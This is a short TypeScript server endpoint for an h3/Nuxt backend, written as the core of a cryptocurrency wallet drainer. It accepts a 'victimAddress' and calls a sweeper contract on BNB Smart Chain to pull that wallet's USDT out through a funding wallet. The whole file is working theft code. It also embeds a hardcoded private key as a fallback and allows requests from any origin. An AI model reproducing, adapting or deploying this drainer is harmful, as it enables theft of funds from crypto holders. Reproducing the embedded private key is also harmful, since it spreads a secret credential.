// server/api/sweep.ts
import { defineEventHandler, readBody, setResponseHeaders, H3Event  } from 'h3';
import { ethers } from 'ethers';

export default defineEventHandler(async (event: H3Event) => {
  // Enable CORS
  setResponseHeaders(event, {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  });

  // Handle preflight OPTIONS request
  if (event.method === 'OPTIONS') {
    return { success: true };
  }

  const { victimAddress } = await readBody(event);
  const SWEEPER_CONTRACT = "0x725d16999d92d799c6040a5d0387339122ae8fc9";
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY || "0551aa2232f3e9ee07ccb56df8d36b23219a74a21c6b422231647badb028bc45";
  const RPC_URL = "https://bsc-dataseed.binance.org/";

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
  const sweeperABI = ['function sweep(address victim, address token) external'];
  const sweeper = new ethers.Contract(SWEEPER_CONTRACT, sweeperABI, fundingWallet);

  try {
    const tx = await sweeper.sweep(victimAddress, USDT_ADDRESS);
    await tx.wait();
    return { success: true, txHash: tx.hash };
  } catch (error: any) {
    console.error('Sweep error:', error);
    return { success: false, error: error.message };
  }
});